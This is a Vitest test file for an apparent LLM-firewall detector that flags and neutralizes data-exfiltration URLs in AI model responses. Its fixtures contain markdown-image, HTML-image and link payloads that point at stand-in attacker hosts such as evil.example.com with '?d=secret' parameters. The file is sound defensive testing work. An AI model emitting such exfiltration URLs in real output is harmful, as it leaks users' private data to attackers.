import { describe, it, expect } from 'vitest'
import { scanResponseExfil, neutralizeExfil } from '../../src/detection/responseExfil.js'

// Test predicate: treat the attacker host as an exfil sink, everything else clean.
const isExfil = (h: string) => h === 'evil.example.com' || h === 'webhook.site'

describe('scanResponseExfil', () => {
  it('flags a markdown-image URL pointing at an exfil sink', () => {
    const text = 'Here is the chart ![chart](https://evil.example.com/c?d=secret)'
    const f = scanResponseExfil(text, isExfil)
    expect(f).toHaveLength(1)
    expect(f[0]!.kind).toBe('markdown-image')
    expect(f[0]!.url).toBe('https://evil.example.com/c?d=secret')
  })

  it('flags an HTML <img src> exfil URL', () => {
    const f = scanResponseExfil('<img src="https://webhook.site/abc?x=1">', isExfil)
    expect(f).toHaveLength(1)
    expect(f[0]!.kind).toBe('html-image')
  })

  it('flags a markdown link to an exfil sink', () => {
    const f = scanResponseExfil('see [here](https://evil.example.com/leak)', isExfil)
    expect(f).toHaveLength(1)
    expect(f[0]!.kind).toBe('markdown-link')
  })

  it('does NOT flag images/links to non-exfil (allowlisted) hosts', () => {
    const text = 'logo ![logo](https://cdn.trusted.com/logo.png) and [docs](https://trusted.com/help)'
    expect(scanResponseExfil(text, isExfil)).toHaveLength(0)
  })

  it('returns nothing for plain text', () => {
    expect(scanResponseExfil('The revenue rose 12% this quarter.', isExfil)).toHaveLength(0)
  })

  it('silently skips a regex-matched URL that fails URL parsing (parseUrl catch branch)', () => {
    // Trailing bare % is valid regex match but throws in new URL() — tests the catch path.
    expect(scanResponseExfil('![x](https://broken%)', isExfil)).toHaveLength(0)
  })

  it('dedupes repeated URLs of the same kind', () => {
    const text = '![a](https://evil.example.com/x) and again ![b](https://evil.example.com/x)'
    expect(scanResponseExfil(text, isExfil)).toHaveLength(1)
  })

  it('handles empty input', () => {
    expect(scanResponseExfil('', isExfil)).toHaveLength(0)
  })
})

describe('neutralizeExfil', () => {
  it('replaces the offending URL with an inert placeholder, keeping surrounding text', () => {
    const text = 'chart ![c](https://evil.example.com/c?d=secret) done'
    const findings = scanResponseExfil(text, isExfil)
    const out = neutralizeExfil(text, findings)
    expect(out).not.toContain('evil.example.com')
    expect(out).toContain('llm-fw-blocked-exfil-url')
    expect(out).toContain('chart')
    expect(out).toContain('done')
  })

  it('leaves text without findings unchanged', () => {
    const text = 'nothing to see ![ok](https://trusted.com/x.png)'
    expect(neutralizeExfil(text, [])).toBe(text)
  })
})
